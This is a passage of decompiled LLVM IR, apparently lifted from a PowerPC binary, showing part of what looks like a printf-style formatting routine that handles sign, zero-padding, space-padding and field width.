  %v1_10005ba0 = mul i32 %v0_10005ba0, 4
  store i32 %v1_10005ba0, i32* %r0.global-to-local, align 4
  %v0_10005ba4 = load i32, i32* @r1, align 4
  %v2_10005ba4 = add i32 %v0_10005ba4, %v1_10005ba0
  %v1_10005ba8 = add i32 %v2_10005ba4, 188
  %v2_10005ba8 = inttoptr i32 %v1_10005ba8 to i32*
  %v3_10005ba8 = load i32, i32* %v2_10005ba8, align 4
  store i32 %v3_10005ba8, i32* %r0.global-to-local, align 4
  %v1_10005bac = call i32 @__asm_rlwinm(i32 %v3_10005ba8, i32 0, i32 20, i32 23)
  br label %dec_label_pc_10005bb0

dec_label_pc_10005bb0:                            ; preds = %dec_label_pc_10005b94, %dec_label_pc_10005ba0
  %v3_10005bb0 = load i32, i32* %stack_var_-344, align 4
  %v0_10005bb4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10005bb4, i32* @r5, align 4
  %v2_10005bb8 = inttoptr i32 %v0_10005bb4 to i32*
  %v3_10005bb8 = call i32 @function_10009fb4(i32 %v3_10005bb0, i32* %v2_10005bb8)
  store i32 %v0_10005bb4, i32* %r7.global-to-local, align 4
  %v0_10005bc8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005bc8, i32* %r8.global-to-local, align 4
  %v6_10005bd0 = call i32 @function_1000a070(i8* %v5_10005bd0, i32 %v3_10005bb8, i32 %v3_10005bb0, i32 %v0_10005bb4, i32 %v0_10005bc8)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_10005bd0, i32* %r30.global-to-local, align 4
  br i1 %tmp75, label %dec_label_pc_10005c24, label %dec_label_pc_10005be4

dec_label_pc_10005be4:                            ; preds = %dec_label_pc_10005bb0
  %v7_10005bd0 = inttoptr i32 %v6_10005bd0 to i8*
  %v3_10005be4 = load i8, i8* %v7_10005bd0, align 1
  %v4_10005be4 = zext i8 %v3_10005be4 to i32
  store i32 %v4_10005be4, i32* %r0.global-to-local, align 4
  %v3_10005bec = icmp eq i8 %v3_10005be4, 45
  br i1 %v3_10005bec, label %dec_label_pc_10005bf4, label %dec_label_pc_10005c08

dec_label_pc_10005bf4:                            ; preds = %dec_label_pc_10005be4
  %v1_10005bf4 = or i32 %v0_10005c18, 2
  store i32 %v1_10005bf4, i32* %r0.global-to-local, align 4
  %v2_10005bf8 = add i32 %v6_10005bd0, 1
  store i32 %v2_10005bf8, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_10005c24

dec_label_pc_10005c08:                            ; preds = %dec_label_pc_10005be4
  %v1_10005c08 = and i32 %v0_10005c18, 2
  store i32 %v1_10005c08, i32* %r0.global-to-local, align 4
  %v3_10005c08 = icmp eq i32 %v1_10005c08, 0
  br i1 %v3_10005c08, label %dec_label_pc_10005c18, label %dec_label_pc_10005c10

dec_label_pc_10005c10:                            ; preds = %dec_label_pc_10005c08
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10005c24

dec_label_pc_10005c18:                            ; preds = %dec_label_pc_10005c08
  %v1_10005c18 = urem i32 %v0_10005c18, 2
  store i32 %v1_10005c18, i32* %r11.global-to-local, align 4
  %v3_10005c18 = icmp eq i32 %v1_10005c18, 0
  br i1 %v3_10005c18, label %dec_label_pc_10005c24, label %dec_label_pc_10005c20

dec_label_pc_10005c20:                            ; preds = %dec_label_pc_10005c18
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_10005c24

dec_label_pc_10005c24:                            ; preds = %dec_label_pc_10005c18, %dec_label_pc_10005bb0, %dec_label_pc_10005c10, %dec_label_pc_10005bf4, %dec_label_pc_10005c20
  %v0_10005c90 = phi i32 [ %v6_10005bd0, %dec_label_pc_10005bb0 ], [ %v2_10005bf8, %dec_label_pc_10005bf4 ], [ %v6_10005bd0, %dec_label_pc_10005c18 ], [ %v6_10005bd0, %dec_label_pc_10005c20 ], [ %v6_10005bd0, %dec_label_pc_10005c10 ]
  %stack_var_-184.0 = phi i32 [ %v0_10005c18, %dec_label_pc_10005bb0 ], [ %v1_10005bf4, %dec_label_pc_10005bf4 ], [ %v0_10005c18, %dec_label_pc_10005c18 ], [ %v0_10005c18, %dec_label_pc_10005c20 ], [ %v0_10005c18, %dec_label_pc_10005c10 ]
  %v3_10005c24 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10005e38, i32* %r0.global-to-local, align 4
  %v2_10005c2c = sub i32 %v2_10005e38, %v0_10005c90
  %v1_10005c30 = add i32 %v2_10005c2c, 127
  store i32 %v1_10005c30, i32* %r31.global-to-local, align 4
  %tmp77 = icmp sgt i32 %v3_10005c24, -1
  br i1 %tmp77, label %dec_label_pc_10005c40, label %dec_label_pc_10005c3c

dec_label_pc_10005c3c:                            ; preds = %dec_label_pc_10005c24
  br label %dec_label_pc_10005c40

dec_label_pc_10005c40:                            ; preds = %dec_label_pc_10005c24, %dec_label_pc_10005c3c
  %v0_10005c74 = phi i32 [ %v3_10005c24, %dec_label_pc_10005c24 ], [ 1, %dec_label_pc_10005c3c ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10005c44 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10005c44, i32* %r11.global-to-local, align 4
  %v3_10005c44 = icmp eq i32 %v1_10005c44, 0
  br i1 %v3_10005c44, label %dec_label_pc_10005c90, label %dec_label_pc_10005c4c

dec_label_pc_10005c4c:                            ; preds = %dec_label_pc_10005c40
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10005c50, label %dec_label_pc_10005c5c, label %dec_label_pc_10005c6c.thread

dec_label_pc_10005c6c.thread:                     ; preds = %dec_label_pc_10005c4c
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10005c90

dec_label_pc_10005c5c:                            ; preds = %dec_label_pc_10005c4c
  br i1 %v3_10005c5c, label %dec_label_pc_10005c64, label %dec_label_pc_10005c6c

dec_label_pc_10005c64:                            ; preds = %dec_label_pc_10005c5c
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10005c90

dec_label_pc_10005c6c:                            ; preds = %dec_label_pc_10005c5c
  br i1 %v3_10005c6c, label %dec_label_pc_10005c74, label %dec_label_pc_10005c90

dec_label_pc_10005c74:                            ; preds = %dec_label_pc_10005c6c
  %v3_10005c74 = icmp ugt i32 %v0_10005c74, %v1_10005c30
  br i1 %v3_10005c74, label %dec_label_pc_10005c90, label %dec_label_pc_10005c7c

dec_label_pc_10005c7c:                            ; preds = %dec_label_pc_10005c74
  %v1_10005c7c = inttoptr i32 %v0_10005c90 to i8*
  %v2_10005c7c = load i8, i8* %v1_10005c7c, align 1
  %v3_10005c7c = zext i8 %v2_10005c7c to i32
  store i32 %v3_10005c7c, i32* %r0.global-to-local, align 4
  %v3_10005c84 = icmp eq i8 %v2_10005c7c, 48
  br i1 %v3_10005c84, label %dec_label_pc_10005c90, label %dec_label_pc_10005c8c

dec_label_pc_10005c8c:                            ; preds = %dec_label_pc_10005c7c
  %v1_10005c8c = add i32 %v2_10005c2c, 128
  br label %dec_label_pc_10005c90

dec_label_pc_10005c90:                            ; preds = %dec_label_pc_10005c6c.thread, %dec_label_pc_10005c6c, %dec_label_pc_10005c7c, %dec_label_pc_10005c74, %dec_label_pc_10005c40, %dec_label_pc_10005c64, %dec_label_pc_10005c8c
  %v1_10005cd8 = phi i32 [ %v0_10005c74, %dec_label_pc_10005c6c ], [ 1, %dec_label_pc_10005c7c ], [ %v0_10005c74, %dec_label_pc_10005c74 ], [ %v0_10005c74, %dec_label_pc_10005c40 ], [ %v0_10005c74, %dec_label_pc_10005c64 ], [ %v1_10005c8c, %dec_label_pc_10005c8c ], [ %v0_10005c74, %dec_label_pc_10005c6c.thread ]
  %v1_10005c90 = inttoptr i32 %v0_10005c90 to i8*
  %v2_10005c90 = load i8, i8* %v1_10005c90, align 1
  %v3_10005c90 = zext i8 %v2_10005c90 to i32
  store i32 %v3_10005c90, i32* %r0.global-to-local, align 4
  %v3_10005c94 = icmp eq i8 %v2_10005c90, 48
  br i1 %v3_10005c94, label %dec_label_pc_10005c9c, label %dec_label_pc_10005cd4

dec_label_pc_10005c9c:                            ; preds = %dec_label_pc_10005c90
  %v0_10005c9c = load i32, i32* @r27, align 4
  %tmp78 = icmp slt i32 %v0_10005c9c, 6
  br i1 %tmp78, label %dec_label_pc_10005ca8, label %dec_label_pc_10005ca4

dec_label_pc_10005ca4:                            ; preds = %dec_label_pc_10005c9c
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_10005ca8

dec_label_pc_10005ca8:                            ; preds = %dec_label_pc_10005c9c, %dec_label_pc_10005ca4
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10005cac, label %dec_label_pc_10005cb4, label %dec_label_pc_10005cc4

dec_label_pc_10005cb4:                            ; preds = %dec_label_pc_10005ca8
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000e5d0.236 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005e50

dec_label_pc_10005cc4:                            ; preds = %dec_label_pc_10005ca8
  %v3_10005cc4 = icmp eq i32 %v1_10005cd8, 0
  br i1 %v3_10005cc4, label %dec_label_pc_10005ccc, label %dec_label_pc_10005cd4

dec_label_pc_10005ccc:                            ; preds = %dec_label_pc_10005cc4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005e50

dec_label_pc_10005cd4:                            ; preds = %dec_label_pc_10005cc4, %dec_label_pc_10005c90
  %v3_10005cd4 = icmp ugt i32 %v1_10005cd8, %v1_10005c30
  %v2_10005cd8 = sub i32 %v1_10005cd8, %v1_10005c30
  store i32 %v2_10005cd8, i32* %r29.global-to-local, align 4
  br i1 %v3_10005cd4, label %dec_label_pc_10005e70thread-pre-split, label %dec_label_pc_10005e50

dec_label_pc_10005ce4:                            ; preds = %dec_label_pc_10005b08
  br i1 %v2_10005ce4, label %dec_label_pc_10005d18, label %dec_label_pc_10005cec

dec_label_pc_10005cec:                            ; preds = %dec_label_pc_10005ce4
  %v3_10005cec = load i32, i32* %stack_var_-344, align 4
  %v0_10005cf8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459272, i32* @lr, align 4
  %v5_10005d04 = call i32 @function_1000a16c(i32 %v0_10005cf8, i32* nonnull %stack_var_-196, i32 268458216, i32 %v3_10005cec)
  %v1_10005d08 = icmp slt i32 %v5_10005d04, 0
  br i1 %v1_10005d08, label %dec_label_pc_10005fd4, label %dec_label_pc_10005d10

dec_label_pc_10005d10:                            ; preds = %dec_label_pc_10005cec
  %v0_10005d10 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005d10 = add i32 %v0_10005d10, %v5_10005d04
  store i32 %v2_10005d10, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005fc0

dec_label_pc_10005d18:                            ; preds = %dec_label_pc_10005ce4
  br i1 %v2_10005d18, label %dec_label_pc_10005dc0, label %dec_label_pc_10005d20

dec_label_pc_10005d20:                            ; preds = %dec_label_pc_10005d18
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10005d2c = load i32, i32* %stack_var_-344, align 4
  %v1_10005d34 = inttoptr i32 %v3_10005d2c to i32*
  %v2_10005d34 = load i32, i32* %v1_10005d34, align 4
  br i1 %v3_10005d18, label %dec_label_pc_10005d34, label %dec_label_pc_10005d88

dec_label_pc_10005d34:                            ; preds = %dec_label_pc_10005d20
  store i32 %v2_10005d34, i32* %r0.global-to-local, align 4
  %v3_10005d38 = icmp eq i32 %v2_10005d34, 0
  store i32 %v2_10005d34, i32* %stack_var_-340, align 4
  br i1 %v3_10005d38, label %dec_label_pc_10005e58, label %dec_label_pc_10005d44

dec_label_pc_10005d44:                            ; preds = %dec_label_pc_10005d34
  %v3_10005d44 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005d44, i32* %r0.global-to-local, align 4
  %v1_10005d4c = icmp slt i32 %v3_10005d44, 0
  br i1 %v1_10005d4c, label %dec_label_pc_10005d58, label %dec_label_pc_10005d54

dec_label_pc_10005d54:                            ; preds = %dec_label_pc_10005d44
  br label %dec_label_pc_10005d58

dec_label_pc_10005d58:                            ; preds = %dec_label_pc_10005d44, %dec_label_pc_10005d54
  %storemerge97 = phi i32 [ %v3_10005d44, %dec_label_pc_10005d54 ], [ -1, %dec_label_pc_10005d44 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 %v2_10005d58, i32* @r3, align 4
  store i32 %v2_10005d5c, i32* @r6, align 4
  store i32 %v2_10005d58, i32* @r4, align 4
  store i32 268459368, i32* @lr, align 4
  %v0_10005d64 = call i32 @function_10009b30()
  %v3_10005d68 = icmp eq i32 %v0_10005d64, -1
  store i32 %v0_10005d64, i32* @r31, align 4
  br i1 %v3_10005d68, label %dec_label_pc_10005fd4, label %dec_label_pc_10005d74

dec_label_pc_10005d74:                            ; preds = %dec_label_pc_10005d58
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005e70

dec_label_pc_10005d88:                            ; preds = %dec_label_pc_10005d20
  store i32 %v2_10005e38, i32* @r28, align 4
  store i32 268459420, i32* @lr, align 4
  %v3_10005d98 = call i32 @function_10009ad4(i32 %v2_10005e38, i32 %v2_10005d34, i32 %v2_10005d5c)
  %v3_10005d9c = icmp eq i32 %v3_10005d98, -1
  store i32 %v3_10005d98, i32* @r31, align 4
  br i1 %v3_10005d9c, label %dec_label_pc_10005fd4, label %dec_label_pc_10005da8

dec_label_pc_10005da8:                            ; preds = %dec_label_pc_10005d88
  store i32 %v2_10005e38, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10005db8 = load i32, i32* @r25, align 4
  %v1_10005db8 = load i32, i32* @r28, align 4
  %v3_10005db8 = trunc i32 %v0_10005db8 to i8
  %v4_10005db8 = add i32 %v1_10005db8, %v3_10005d98
  %v5_10005db8 = inttoptr i32 %v4_10005db8 to i8*
  store i8 %v3_10005db8, i8* %v5_10005db8, align 1
  %v0_10005e74.pre.pre = load i32, i32* @r31, align 4
  %v1_10005e74.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005e70thread-pre-split

dec_label_pc_10005dc0:                            ; preds = %dec_label_pc_10005d18
  br i1 %v2_10005dc0, label %dec_label_pc_10005e2c, label %dec_label_pc_10005dc8

dec_label_pc_10005dc8:                            ; preds = %dec_label_pc_10005dc0
  %v3_10005dcc = load i32, i32* %stack_var_-344, align 4
  %v1_10005dd4 = inttoptr i32 %v3_10005dcc to i32*
  %v2_10005dd4 = load i32, i32* %v1_10005dd4, align 4
  br i1 %v3_10005dc0, label %dec_label_pc_10005dd4, label %dec_label_pc_10005e04

dec_label_pc_10005dd4:                            ; preds = %dec_label_pc_10005dc8
  store i32 %v2_10005dd4, i32* %r30.global-to-local, align 4
  %v3_10005dd8 = icmp eq i32 %v2_10005dd4, 0
  br i1 %v3_10005dd8, label %dec_label_pc_10005e58, label %dec_label_pc_10005de0

dec_label_pc_10005de0:                            ; preds = %dec_label_pc_10005dd4, %dec_label_pc_10005e34
  %v0_10005df4 = phi i32 [ %v2_10005dd4, %dec_label_pc_10005dd4 ], [ %v3_10005e44, %dec_label_pc_10005e34 ]
  %v3_10005de0 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005de0, i32* %r0.global-to-local, align 4
  %v1_10005de8 = icmp slt i32 %v3_10005de0, 0
  br i1 %v1_10005de8, label %dec_label_pc_10005df4, label %dec_label_pc_10005df0

dec_label_pc_10005df0:                            ; preds = %dec_label_pc_10005de0
  br label %dec_label_pc_10005df4

dec_label_pc_10005df4:                            ; preds = %dec_label_pc_10005de0, %dec_label_pc_10005df0
  %storemerge98 = phi i32 [ %v3_10005de0, %dec_label_pc_10005df0 ], [ -1, %dec_label_pc_10005de0 ]
  store i32 %storemerge98, i32* @r4, align 4
  store i32 268459516, i32* @lr, align 4
  %v1_10005df8 = inttoptr i32 %v0_10005df4 to i8*
  %v2_10005df8 = call i32 @function_100074d0(i8* %v1_10005df8)
  store i32 %v2_10005df8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005e64

dec_label_pc_10005e04:                            ; preds = %dec_label_pc_10005dc8
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 %v2_10005e38, i32* %r30.global-to-local, align 4
  store i32 %v2_10005dd4, i32* %stack_var_-328, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005e70thread-pre-split

dec_label_pc_10005e2c:                            ; preds = %dec_label_pc_10005dc0
  br i1 %v3_10005e2c, label %dec_label_pc_10005e34, label %dec_label_pc_10005fd4

dec_label_pc_10005e34:                            ; preds = %dec_label_pc_10005e2c
  %v0_10005e34 = call i32 @function_10004e38()
  %v1_10005e3c = inttoptr i32 %v0_10005e34 to i32*
  %v2_10005e3c = load i32, i32* %v1_10005e3c, align 4
  store i32 %v2_10005e3c, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268459592, i32* @lr, align 4
  %v3_10005e44 = call i32 @function_100075c0(i32 %v2_10005e3c, i32 %v2_10005e38, i32 128)
  store i32 %v3_10005e44, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005de0

dec_label_pc_10005e50:                            ; preds = %dec_label_pc_10005cd4, %dec_label_pc_10005ccc, %dec_label_pc_10005cb4
  %v0_10005e74.pre41 = phi i32 [ %v1_10005c30, %dec_label_pc_10005cd4 ], [ 0, %dec_label_pc_10005ccc ], [ 5, %dec_label_pc_10005cb4 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005e70thread-pre-split

dec_label_pc_10005e58:                            ; preds = %dec_label_pc_10005dd4, %dec_label_pc_10005d34
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000e5d8.237 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005e64

dec_label_pc_10005e64:                            ; preds = %dec_label_pc_10005df4, %dec_label_pc_10005e58
  %v0_10005e7429 = phi i32 [ %v2_10005df8, %dec_label_pc_10005df4 ], [ 6, %dec_label_pc_10005e58 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10005e70

dec_label_pc_10005e70thread-pre-split:            ; preds = %dec_label_pc_10005da8, %dec_label_pc_10005e04, %dec_label_pc_10005e50, %dec_label_pc_10005cd4
  %v1_10005e74.pre = phi i32 [ %v2_10005cd8, %dec_label_pc_10005cd4 ], [ 0, %dec_label_pc_10005e50 ], [ %v1_10005e74.pre.pre, %dec_label_pc_10005da8 ], [ 0, %dec_label_pc_10005e04 ]
  %v0_10005e74.pre = phi i32 [ %v1_10005c30, %dec_label_pc_10005cd4 ], [ %v0_10005e74.pre41, %dec_label_pc_10005e50 ], [ %v0_10005e74.pre.pre, %dec_label_pc_10005da8 ], [ 1, %dec_label_pc_10005e04 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_10005cd4 ], [ %stack_var_-184.0, %dec_label_pc_10005e50 ], [ %v0_10005c18, %dec_label_pc_10005da8 ], [ %v0_10005c18, %dec_label_pc_10005e04 ]
  %v0_10005e70.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10005e70

dec_label_pc_10005e70:                            ; preds = %dec_label_pc_10005e70thread-pre-split, %dec_label_pc_10005d74, %dec_label_pc_10005e64
  %v1_10005e74 = phi i32 [ %v1_10005e74.pre, %dec_label_pc_10005e70thread-pre-split ], [ 0, %dec_label_pc_10005d74 ], [ 0, %dec_label_pc_10005e64 ]
  %v0_10005e74 = phi i32 [ %v0_10005e74.pre, %dec_label_pc_10005e70thread-pre-split ], [ %v0_10005d64, %dec_label_pc_10005d74 ], [ %v0_10005e7429, %dec_label_pc_10005e64 ]
  %v0_10005e7c = phi i32 [ %v0_10005e70.pr, %dec_label_pc_10005e70thread-pre-split ], [ 11, %dec_label_pc_10005d74 ], [ 11, %dec_label_pc_10005e64 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10005e70thread-pre-split ], [ %v0_10005c18, %dec_label_pc_10005d74 ], [ %v0_10005c18, %dec_label_pc_10005e64 ]
  %v3_10005e70 = icmp eq i32 %v0_10005e7c, 11
  %v2_10005e74 = add i32 %v0_10005e74, %v1_10005e74
  store i32 %v2_10005e74, i32* %r0.global-to-local, align 4
  br i1 %v3_10005e70, label %dec_label_pc_10005e90, label %dec_label_pc_10005e7c

dec_label_pc_10005e7c:                            ; preds = %dec_label_pc_10005e70
  %v0_10005e80 = call i32 @__asm_mfcr()
  %v1_10005e84 = call i32 @__asm_rlwinm(i32 %v0_10005e80, i32 30, i32 31, i32 31)
  %v1_10005e88 = add i32 %v1_10005e84, 1
  %v0_10005e8c = load i32, i32* %r0.global-to-local, align 4
  %v2_10005e8c = add i32 %v0_10005e8c, %v1_10005e88
  store i32 %v2_10005e8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005e90

dec_label_pc_10005e90:                            ; preds = %dec_label_pc_10005e70, %dec_label_pc_10005e7c
  %v0_10005ea8 = phi i32 [ %v2_10005e74, %dec_label_pc_10005e70 ], [ %v2_10005e8c, %dec_label_pc_10005e7c ]
  %v3_10005e98 = icmp ugt i32 %tmp, %v0_10005ea8
  br i1 %v3_10005e98, label %dec_label_pc_10005ea0, label %dec_label_pc_10005ea4

dec_label_pc_10005ea0:                            ; preds = %dec_label_pc_10005e90
  %v2_10005ea0 = sub i32 %tmp, %v0_10005ea8
  br label %dec_label_pc_10005ea4

dec_label_pc_10005ea4:                            ; preds = %dec_label_pc_10005e90, %dec_label_pc_10005ea0
  %storemerge96 = phi i32 [ %v2_10005ea0, %dec_label_pc_10005ea0 ], [ 0, %dec_label_pc_10005e90 ]
  %v1_10005eb4 = phi i32 [ %v2_10005ea0, %dec_label_pc_10005ea0 ], [ 0, %dec_label_pc_10005e90 ]
  store i32 %storemerge96, i32* @r28, align 4
  %v0_10005ea4 = load i32, i32* @r26, align 4
  %v3_10005ea4 = icmp eq i32 %v0_10005ea4, 48
  %v2_10005ea8 = add i32 %v1_10005eb4, %v0_10005ea8
  store i32 %v2_10005ea8, i32* %r0.global-to-local, align 4
  %v0_10005eac = load i32, i32* %r23.global-to-local, align 4
  %v2_10005eac = add i32 %v0_10005eac, %v2_10005ea8
  store i32 %v2_10005eac, i32* %r23.global-to-local, align 4
  br i1 %v3_10005ea4, label %dec_label_pc_10005eb4, label %dec_label_pc_10005ebc

dec_label_pc_10005eb4:                            ; preds = %dec_label_pc_10005ea4
  %v0_10005eb4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10005eb4 = add i32 %v0_10005eb4, %v1_10005eb4
  store i32 %v2_10005eb4, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10005ebc

dec_label_pc_10005ebc:                            ; preds = %dec_label_pc_10005ea4, %dec_label_pc_10005eb4
  %v0_10005ed0 = phi i32 [ %v1_10005eb4, %dec_label_pc_10005ea4 ], [ 0, %dec_label_pc_10005eb4 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10005ec0 = and i32 %stack_var_-184.1, 8
  %v3_10005ec0 = icmp eq i32 %v1_10005ec0, 0
  br i1 %v3_10005ec0, label %dec_label_pc_10005ec8, label %dec_label_pc_10005ee4

dec_label_pc_10005ec8:                            ; preds = %dec_label_pc_10005ebc
  %v0_10005ec8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459736, i32* @lr, align 4
  %v4_10005ed4 = call i32 @function_10005888(i32 %v0_10005ec8, i8 32, i32 %v0_10005ed0)
  %v1_10005ed8 = load i32, i32* @r28, align 4
  %v4_10005ed8 = icmp eq i32 %v4_10005ed4, %v1_10005ed8
  br i1 %v4_10005ed8, label %dec_label_pc_10005ee0, label %dec_label_pc_10005fd4

dec_label_pc_10005ee0:                            ; preds = %dec_label_pc_10005ec8
  br label %dec_label_pc_10005ee4

dec_label_pc_10005ee4:                            ; preds = %dec_label_pc_10005ebc, %dec_label_pc_10005ee0
  %v0_10005ee8 = load i32, i32* %r24.global-to-local, align 4
  %v0_10005ef0 = load i32, i32* @r27, align 4
  %v2_10005ef0 = add i32 %v0_10005ef0, ptrtoint (i32* @global_var_1000e5e0.238 to i32)
  store i32 268459768, i32* @lr, align 4
  %v2_10005ef4 = call i32 @function_10006ff0(i32 %v2_10005ef0, i32 %v0_10005ee8)
  %v0_10005f00 = load i32, i32* @r29, align 4
  store i32 268459784, i32* @lr, align 4
  %v4_10005f04 = call i32 @function_10005888(i32 %v0_10005ee8, i8 48, i32 %v0_10005f00)
  %v1_10005f08 = load i32, i32* @r29, align 4
  %v4_10005f08 = icmp eq i32 %v4_10005f04, %v1_10005f08
  br i1 %v4_10005f08, label %dec_label_pc_10005f10, label %dec_label_pc_10005fd4

dec_label_pc_10005f10:                            ; preds = %dec_label_pc_10005ee4
  %v3_10005f10 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10005f10, i32* %r0.global-to-local, align 4
  %v3_10005f14 = icmp eq i32 %v3_10005f10, 0
  br i1 %v3_10005f14, label %dec_label_pc_10005f1c, label %dec_label_pc_10005f44

dec_label_pc_10005f1c:                            ; preds = %dec_label_pc_10005f10
  %v0_10005f1c = load i32, i32* @r31, align 4
  %v3_10005f1c = icmp eq i32 %v0_10005f1c, 0
  br i1 %v3_10005f1c, label %dec_label_pc_10005f38.thread, label %dec_label_pc_10005f38

dec_label_pc_10005f38.thread:                     ; preds = %dec_label_pc_10005f1c
  br label %dec_label_pc_10005fa8

dec_label_pc_10005f38:                            ; preds = %dec_label_pc_10005f1c
  %v0_10005f28 = load i32, i32* @r30, align 4
  %v0_10005f30 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459832, i32* @lr, align 4
  %v4_10005f34 = inttoptr i32 %v0_10005f30 to i16*
  %v5_10005f34 = call i32 @function_10009d50(i32 %v0_10005f28, i32 %v0_10005f1c, i16* %v4_10005f34)
  %v1_10005f38.pre = load i32, i32* @r31, align 4
  %v4_10005f38 = icmp eq i32 %v5_10005f34, %v1_10005f38.pre
  br i1 %v4_10005f38, label %dec_label_pc_10005fa8, label %dec_label_pc_10005fd4

dec_label_pc_10005f44:                            ; preds = %dec_label_pc_10005f10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10005f8c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005f8c

dec_label_pc_10005f50:                            ; preds = %dec_label_pc_10005f8c
  %v2_10005fa0 = icmp ugt i32 %v0_10005f50, 128
  %v0_10005f50. = select i1 %v2_10005fa0, i32 128, i32 %v0_10005f50
  store i32 %v0_10005f50., i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10005f60.239 to i32), i32* @lr, align 4
  %v0_10005f5c = call i32 @function_10009b30()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10005f5c, i32* @r30, align 4
  %v3_10005f64 = icmp eq i32 %v0_10005f5c, 0
  br i1 %v3_10005f64, label %dec_label_pc_10005f80, label %dec_label_pc_10005f78

dec_label_pc_10005f78:                            ; preds = %dec_label_pc_10005f50
  %v0_10005f68 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459900, i32* @lr, align 4
  %v3_10005f78 = inttoptr i32 %v0_10005f68 to i16*
  %v4_10005f78 = call i32 @function_10009d50(i32 %v2_10005e38, i32 %v0_10005f5c, i16* %v3_10005f78)
  store i32 %v4_10005f78, i32* %r0.global-to-local, align 4
  %v1_10005f80.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005f80

dec_label_pc_10005f80:                            ; preds = %dec_label_pc_10005f50, %dec_label_pc_10005f78
  %v1_10005f80 = phi i32 [ 0, %dec_label_pc_10005f50 ], [ %v1_10005f80.pre, %dec_label_pc_10005f78 ]
  %v0_10005f84 = phi i32 [ 0, %dec_label_pc_10005f50 ], [ %v4_10005f78, %dec_label_pc_10005f78 ]
  %v4_10005f80 = icmp eq i32 %v0_10005f84, %v1_10005f80
  %v1_10005f84 = load i32, i32* @r31, align 4
  %v2_10005f84 = sub i32 %v1_10005f84, %v0_10005f84
  store i32 %v2_10005f84, i32* @r31, align 4
  br i1 %v4_10005f80, label %dec_label_pc_10005f8c, label %dec_label_pc_10005fd4

dec_label_pc_10005f8c:                            ; preds = %dec_label_pc_10005f80, %dec_label_pc_10005f44
  %v0_10005f50 = phi i32 [ %v2_10005f84, %dec_label_pc_10005f80 ], [ %v0_10005f8c.pre, %dec_label_pc_10005f44 ]
  %v3_10005f8c = icmp eq i32 %v0_10005f50, 0
  store i32 %v2_10005e38, i32* @r29, align 4
  store i32 %v2_10005d58, i32* @r4, align 4
  store i32 %v2_10005d5c, i32* @r6, align 4
  store i32 %v2_10005e38, i32* @r3, align 4
  br i1 %v3_10005f8c, label %dec_label_pc_10005fa8, label %dec_label_pc_10005f50

dec_label_pc_10005fa8:                            ; preds = %dec_label_pc_10005f8c, %dec_label_pc_10005f38.thread, %dec_label_pc_10005f38
  %v0_10005fa8 = load i32, i32* %r24.global-to-local, align 4
  %v0_10005fb0 = load i32, i32* @r28, align 4
  store i32 268459960, i32* @lr, align 4
